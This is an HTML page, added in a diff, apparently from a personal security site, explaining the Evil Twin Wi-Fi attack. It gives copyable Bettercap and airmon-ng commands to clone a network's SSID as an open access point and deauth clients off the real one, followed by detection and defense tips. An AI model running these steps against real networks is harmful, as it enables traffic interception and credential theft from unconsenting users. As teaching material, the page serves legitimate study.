@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Evil Twin — Network · Adamwelt</title>
+<style>
+  :root{
+    --bg:#0d1117;
+    --bg-raised:#151b23;
+    --ink:#e6edf3;
+    --ink-muted:#8b949e;
+    --line:#232b36;
+    --signal:#ffb454;
+    --signal-dim:#7a5a2c;
+  }
+
+  *{margin:0;padding:0;box-sizing:border-box;}
+
+  html,body{
+    background:var(--bg);
+    color:var(--ink);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  .mono{
+    font-family:"JetBrains Mono","SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+  }
+
+  a{color:inherit;text-decoration:none;}
+  ::selection{background:var(--signal-dim);color:var(--ink);}
+
+  /* ---------- Top bar (same as index) ---------- */
+  .topbar{
+    position:sticky;top:0;z-index:40;
+    display:flex;align-items:center;gap:14px;
+    height:54px;padding:0 16px;
+    background:rgba(13,17,23,.92);
+    backdrop-filter:blur(6px);
+    border-bottom:1px solid var(--line);
+  }
+  .menu-btn{
+    display:flex;flex-direction:column;justify-content:center;gap:4px;
+    width:38px;height:38px;border:1px solid var(--line);
+    background:var(--bg-raised);cursor:pointer;border-radius:6px;flex-shrink:0;
+  }
+  .menu-btn:hover{border-color:var(--signal-dim);}
+  .menu-btn:focus-visible{outline:2px solid var(--signal);outline-offset:2px;}
+  .menu-btn span{display:block;width:16px;height:2px;background:var(--ink-muted);margin:0 auto;transition:transform .2s ease, opacity .2s ease, background .2s ease;}
+  .menu-btn[aria-expanded="true"] span{background:var(--signal);}
+  .menu-btn[aria-expanded="true"] span:nth-child(1){transform:translateY(6px) rotate(45deg);}
+  .menu-btn[aria-expanded="true"] span:nth-child(2){opacity:0;}
+  .menu-btn[aria-expanded="true"] span:nth-child(3){transform:translateY(-6px) rotate(-45deg);}
+
+  .brand{font-size:14.5px;font-weight:600;letter-spacing:.02em;display:flex;align-items:center;gap:6px;}
+  .brand .prompt{color:var(--signal);}
+  .brand .crumb{color:var(--ink-muted);}
+  .brand .cursor{display:inline-block;width:7px;height:14px;background:var(--signal);margin-left:2px;vertical-align:-2px;animation:blink 1.1s steps(1) infinite;}
+  @keyframes blink{50%{opacity:0;}}
+
+  /* ---------- Drawer ---------- */
+  .scrim{position:fixed;inset:0;background:rgba(0,0,0,.6);opacity:0;pointer-events:none;transition:opacity .25s ease;z-index:45;}
+  .scrim.open{opacity:1;pointer-events:auto;}
+  .drawer{
+    position:fixed;top:0;left:0;height:100%;width:290px;max-width:84vw;
+    background:var(--bg-raised);border-right:1px solid var(--line);
+    transform:translateX(-100%);transition:transform .28s cubic-bezier(.4,0,.2,1);
+    z-index:50;overflow-y:auto;display:flex;flex-direction:column;
+  }
+  .drawer.open{transform:translateX(0);}
+  .drawer-head{display:flex;align-items:center;height:54px;padding:0 18px;border-bottom:1px solid var(--line);font-size:12px;letter-spacing:.08em;text-transform:uppercase;color:var(--ink-muted);}
+  .drawer nav{padding:6px 0 16px;}
+  .drawer-group{padding:14px 18px 4px;}
+  .drawer-group-label{font-size:11px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--signal);opacity:.85;}
+  .drawer a.drawer-link{display:flex;align-items:center;gap:8px;padding:9px 18px;font-size:13.5px;color:var(--ink);border-left:2px solid transparent;}
+  .drawer a.drawer-link:hover{background:rgba(255,180,84,.06);border-left-color:var(--signal);}
+  .drawer a.drawer-link.active{border-left-color:var(--signal);color:var(--signal);}
+  .drawer a.drawer-link:focus-visible{outline:2px solid var(--signal);outline-offset:-2px;}
+  .drawer a.drawer-link::before{content:"›";color:var(--ink-muted);}
+
+  /* ---------- Page body ---------- */
+  main{max-width:680px;margin:0 auto;padding:36px 20px 40px;}
+
+  .eyebrow{font-size:11px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--signal);}
+
+  h1{font-size:26px;font-weight:600;letter-spacing:-.2px;margin-top:8px;}
+  .lede{margin-top:10px;font-size:15px;line-height:1.65;color:var(--ink-muted);max-width:58ch;}
+
+  h2{font-size:17px;font-weight:600;margin-top:34px;margin-bottom:10px;}
+  h2 .num{color:var(--signal);margin-right:6px;}
+
+  p{font-size:14.5px;line-height:1.7;color:var(--ink-muted);max-width:60ch;}
+  p + p{margin-top:10px;}
+
+  ul{margin-top:10px;padding-left:18px;}
+  li{font-size:14.5px;line-height:1.7;color:var(--ink-muted);}
+  li::marker{color:var(--signal);}
+
+  /* ---------- Code block ---------- */
+  .code{
+    margin-top:14px;
+    background:var(--bg-raised);
+    border:1px solid var(--line);
+    border-radius:10px;
+    overflow:hidden;
+  }
+  .code-head{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:8px 12px;
+    border-bottom:1px solid var(--line);
+  }
+  .code-label{font-size:11.5px;color:var(--ink-muted);letter-spacing:.02em;}
+  .copy-btn{
+    display:flex;align-items:center;gap:6px;
+    font-size:11.5px;
+    color:var(--ink-muted);
+    background:transparent;
+    border:1px solid var(--line);
+    border-radius:6px;
+    padding:4px 9px;
+    cursor:pointer;
+    transition:border-color .15s ease, color .15s ease;
+  }
+  .copy-btn:hover{border-color:var(--signal-dim);color:var(--signal);}
+  .copy-btn:focus-visible{outline:2px solid var(--signal);outline-offset:2px;}
+  .copy-btn svg{width:12px;height:12px;flex-shrink:0;}
+  .copy-btn.copied{color:var(--signal);border-color:var(--signal-dim);}
+
+  .code pre{
+    padding:14px 16px;
+    font-size:13px;
+    line-height:1.65;
+    overflow-x:auto;
+    color:var(--ink);
+  }
+  .code .cmt{color:var(--ink-muted);}
+  .code .flag{color:var(--signal);}
+  .code .str{color:#ffcf85;}
+
+  .example-tag{
+    display:inline-block;
+    font-size:10.5px;
+    letter-spacing:.06em;
+    text-transform:uppercase;
+    color:var(--signal);
+    background:rgba(255,180,84,.08);
+    border:1px solid var(--signal-dim);
+    border-radius:5px;
+    padding:2px 7px;
+    margin-top:14px;
+  }
+
+  .note{
+    margin-top:16px;
+    background:rgba(255,180,84,.05);
+    border:1px solid var(--signal-dim);
+    border-radius:10px;
+    padding:14px 16px;
+  }
+  .note .note-label{font-size:11px;font-weight:600;letter-spacing:.06em;text-transform:uppercase;color:var(--signal);margin-bottom:6px;}
+  .note p{color:var(--ink);}
+
+  footer{
+    margin-top:48px;
+    border-top:1px solid var(--line);
+    padding:22px 20px 32px;
+    text-align:center;
+    font-size:12px;
+    color:var(--ink-muted);
+  }
+
+  @media (min-width:720px){ h1{font-size:32px;} }
+</style>
+</head>
+<body>
+
+  <div class="scrim" id="scrim"></div>
+
+  <aside class="drawer" id="drawer" aria-hidden="true">
+    <div class="drawer-head mono">techniques/</div>
+    <nav>
+      <div class="drawer-group">
+        <div class="drawer-group-label mono">Network</div>
+        <a class="drawer-link" href="wpa2-handshake-capture.html">WPA2 Handshake Capture</a>
+        <a class="drawer-link" href="deauth-flooder.html">Deauth Flooder</a>
+        <a class="drawer-link" href="man-in-the-middle.html">Man-in-the-Middle</a>
+        <a class="drawer-link" href="honeypot.html">Honeypot</a>
+        <a class="drawer-link active" href="evil-twin.html">Evil Twin</a>
+      </div>
+      <div class="drawer-group">
+        <div class="drawer-group-label mono">Physical</div>
+        <a class="drawer-link" href="#">NFC Emulate</a>
+        <a class="drawer-link" href="#">Infrared</a>
+      </div>
+    </nav>
+  </aside>
+
+  <header class="topbar">
+    <button class="menu-btn" id="menuBtn" aria-label="Open menu" aria-expanded="false" aria-controls="drawer">
+      <span></span><span></span><span></span>
+    </button>
+    <div class="brand mono"><span class="prompt">~</span><span class="crumb">/network/evil-twin</span><span class="cursor"></span></div>
+  </header>
+
+  <main>
+    <div class="eyebrow mono">NETWORK</div>
+    <h1>Evil Twin</h1>
+    <p class="lede">Cloning a real access point's exact SSID with Bettercap, then deauthing clients off the original so they reconnect to the impostor instead.</p>
+
+    <h2><span class="num mono">01</span>What it is</h2>
+    <p>An evil twin is a rogue access point that copies the name — and often the appearance of a captive portal — of a legitimate network the target already trusts. Unlike a honeypot, which relies on a device auto-joining a remembered name, an evil twin actively targets one specific real network, aiming to pull its clients over by matching it exactly.</p>
+
+    <h2><span class="num mono">02</span>How it works</h2>
+    <p>Bettercap first identifies the target network's SSID, then broadcasts a second access point using that same name. Since devices generally can't distinguish two networks by name alone, forcing existing clients to disconnect — with a deauth flood — increases the odds they'll reconnect to whichever AP answers first, which can be the attacker's clone rather than the original.</p>
+
+    <ul>
+      <li>Identify the target access point's SSID</li>
+      <li>Clone it with a second access point of the same name</li>
+      <li>Deauth clients off the real access point</li>
+      <li>Let clients reconnect to the clone instead</li>
+      <li>Log or serve a captive portal to connected clients</li>
+    </ul>
+
+    <div class="code">
+      <div class="code-head">
+        <span class="code-label mono">1 · monitor mode</span>
+        <button class="copy-btn mono" data-copy="sudo airmon-ng start wlan0">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+          Copy
+        </button>
+      </div>
+      <pre class="mono">sudo airmon-ng start wlan0</pre>
+    </div>
+
+    <div class="code">
+      <div class="code-head">
+        <span class="code-label mono">2 · launch bettercap</span>
+        <button class="copy-btn mono" data-copy="sudo bettercap -iface wlan0mon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+          Copy
+        </button>
+      </div>
+      <pre class="mono">sudo bettercap -iface wlan0mon</pre>
+    </div>
+
+    <div class="code">
+      <div class="code-head">
+        <span class="code-label mono">3 · find the target ssid</span>
+        <button class="copy-btn mono" data-copy="wifi.recon on
+wifi.show">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+          Copy
+        </button>
+      </div>
+      <pre class="mono">wifi.recon on
+wifi.show</pre>
+    </div>
+
+    <div class="code">
+      <div class="code-head">
+        <span class="code-label mono">4 · clone the ap</span>
+        <button class="copy-btn mono" data-copy="set wifi.ap.ssid HomeNetwork
+set wifi.ap.encryption false">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+          Copy
+        </button>
+      </div>
+      <pre class="mono">set wifi.ap.ssid <span class="str">HomeNetwork</span>
+set wifi.ap.encryption <span class="flag">false</span></pre>
+    </div>
+
+    <div class="code">
+      <div class="code-head">
+        <span class="code-label mono">5 · start the clone</span>
+        <button class="copy-btn mono" data-copy="wifi.ap">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+          Copy
+        </button>
+      </div>
+      <pre class="mono">wifi.ap</pre>
+    </div>
+
+    <div class="code">
+      <div class="code-head">
+        <span class="code-label mono">6 · push clients off the real ap</span>
+        <button class="copy-btn mono" data-copy="set wifi.deauth.skip-broadcast false
+wifi.deauth AA:BB:CC:DD:EE:FF">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+          Copy
+        </button>
+      </div>
+      <pre class="mono">set wifi.deauth.skip-broadcast <span class="flag">false</span>
+wifi.deauth <span class="flag">AA:BB:CC:DD:EE:FF</span></pre>
+    </div>
+
+    <div class="code">
+      <div class="code-head">
+        <span class="code-label mono">7 · tear down</span>
+        <button class="copy-btn mono" data-copy="wifi.ap off
+wifi.recon off">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+          Copy
+        </button>
+      </div>
+      <pre class="mono">wifi.ap off
+wifi.recon off</pre>
+    </div>
+
+    <div class="note">
+      <div class="note-label mono">Note</div>
+      <p>An evil twin only works because SSIDs aren't cryptographically tied to a specific access point — the name is just a label. The real network's BSSID (MAC address) stays different, which is the one thing the clone can't fake without also spoofing that.</p>
+    </div>
+
+    <h2><span class="num mono">03</span>Detection &amp; defense</h2>
+    <p>Because the clone shares a name with a legitimate network, spotting it usually means looking past the SSID: two access points broadcasting the same name with different signal strength, encryption, or BSSID is the giveaway. Combined with an active deauth flood on the original, the attack pattern is distinct from ordinary interference.</p>
+    <ul>
+      <li>Use WPA2/WPA3-Enterprise where the client verifies a server certificate, not just a passphrase</li>
+      <li>Enable 802.11w so deauth frames used to force reconnects can't be forged</li>
+      <li>Watch for duplicate SSIDs with mismatched BSSIDs or encryption settings</li>
+      <li>Prefer a VPN on any network, so even a successful evil twin can't read the traffic</li>
+    </ul>
+
+  </main>
+
+  <footer class="mono">No tracking. No accounts.</footer>
+
+  <script>
+    const menuBtn = document.getElementById('menuBtn');
+    const drawer = document.getElementById('drawer');
+    const scrim = document.getElementById('scrim');
+
+    function openDrawer(){
+      drawer.classList.add('open');
+      scrim.classList.add('open');
+      drawer.setAttribute('aria-hidden','false');
+      menuBtn.setAttribute('aria-expanded','true');
+    }
+    function closeDrawer(){
+      drawer.classList.remove('open');
+      scrim.classList.remove('open');
+      drawer.setAttribute('aria-hidden','true');
+      menuBtn.setAttribute('aria-expanded','false');
+    }
+
+    menuBtn.addEventListener('click', () => {
+      drawer.classList.contains('open') ? closeDrawer() : openDrawer();
+    });
+    scrim.addEventListener('click', closeDrawer);
+    document.addEventListener('keydown', e => {
+      if(e.key === 'Escape') closeDrawer();
+    });
+
+    document.querySelectorAll('.copy-btn').forEach(btn => {
+      btn.addEventListener('click', async () => {
+        const text = btn.getAttribute('data-copy');
+        try {
+          await navigator.clipboard.writeText(text);
+        } catch (e) {
+          const ta = document.createElement('textarea');
+          ta.value = text;
+          document.body.appendChild(ta);
+          ta.select();
+          document.execCommand('copy');
+          document.body.removeChild(ta);
+        }
+        const original = btn.innerHTML;
+        btn.classList.add('copied');
+        btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6 9 17l-5-5"/></svg>Copied';
+        setTimeout(() => {
+          btn.classList.remove('copied');
+          btn.innerHTML = original;
+        }, 1500);
+      });
+    });
+  </script>
+
+</body>
+</html>
